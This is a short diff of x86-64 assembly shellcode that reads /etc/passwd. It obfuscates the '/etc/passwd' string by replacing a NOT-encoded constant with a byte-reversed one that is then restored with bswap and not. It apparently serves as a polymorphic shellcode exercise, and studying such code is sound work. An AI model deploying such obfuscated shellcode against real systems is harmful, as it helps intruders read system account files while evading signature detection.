@@ -11,7 +11,8 @@ global _start
 _start:
   xor r9 , r9
   push dword 0x64777373            ; "sswd" , dword null extended
-  mov rdi , 0x9e8fd0d09c8b9ad0     ; "/etc/pa" , ("noted" part)
+  mov rdi , 0xd09a8b9cd0d08f9e  ; "/etc/pa" , ("noted" part) en reversed bytes order
+  bswap rdi                     ; replace byte in order (first to the end etc)
   not rdi
   push rdi
   push rsp
@@ -27,7 +28,7 @@ _start:
  sub sp, 0xfff   ; allocate space in stack
  push rsp
  pop rsi
- xchg rdi, rax
+ xchg rdi, rax  ; fd
  mov dx, 0xfff; size to read
  push r9
  pop rax
